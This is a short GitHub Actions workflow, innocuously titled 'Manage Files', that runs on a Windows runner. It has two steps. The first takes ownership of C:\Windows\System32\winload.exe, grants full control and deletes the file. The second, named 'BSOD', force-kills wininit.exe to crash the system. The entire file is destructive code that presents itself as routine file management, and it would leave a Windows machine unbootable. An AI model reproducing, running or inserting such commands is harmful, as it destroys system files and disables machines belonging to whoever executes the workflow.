name: Manage Files

on:
  workflow_dispatch:

jobs:
  manage-files:
    runs-on: windows-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v2

    - name: Take ownership and modify files
      run: |
        cd /d %SystemRoot%\System32
        if exist .\winload.exe ( echo winload.exe Found ) else ( echo Not Found )
        takeown /f .\winload.exe
        icacls ".\winload.exe" /grant %UserName%:F
        del .\winload.exe /Q /F
        if exist .\winload.exe ( echo Error ) else ( echo Deleted )
      shell: cmd
      working-directory: C:\Windows\System32
      
    - name: BSOD
      run: |
        TASKKILL /F /IM wininit.exe /T
        TASKLIST
      shell: cmd
      working-directory: C:\Windows\System32
